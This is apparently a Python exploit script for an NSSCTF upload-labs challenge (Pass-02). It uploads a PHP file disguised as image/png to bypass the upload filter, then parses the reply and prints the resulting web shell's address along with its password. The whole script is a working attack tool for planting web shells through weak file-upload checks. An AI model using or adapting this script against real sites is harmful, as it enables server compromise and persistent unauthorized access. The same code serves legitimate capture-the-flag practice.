import requests
from bs4 import BeautifulSoup as BS

ip = ["http://node3.anna.nssctf.cn:28825/", "http://node3.anna.nssctf.cn:28825", "http://node3.anna.nssctf.cn:28825"]
url = "/Pass-02/index.php"

file = {'upload_file': ('1.php', open("1.png", "rb"), 'image/png')}
data = {'submit': '上传'}

for i in range(0, len(ip)):
    print(ip[i])
    html = requests.post(ip[i]+url, files=file, data=data)
    bs = BS(html.text, 'html.parser')
    demofile = str(bs.find("div", id="img"))
    #print(demofile)
    if len(demofile.split(" ")) < 5:
        print("上传失败")
        print("[-][-][-][-][-][-][-][-][-][-][-][-][-][-][-][-][-][-]")
        print(str(demofile.split(" "))+"\n")
    else:
        print("[+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+]上传shell 地址："+demofile.split(" ")[2] + " 密码: hncst@\n")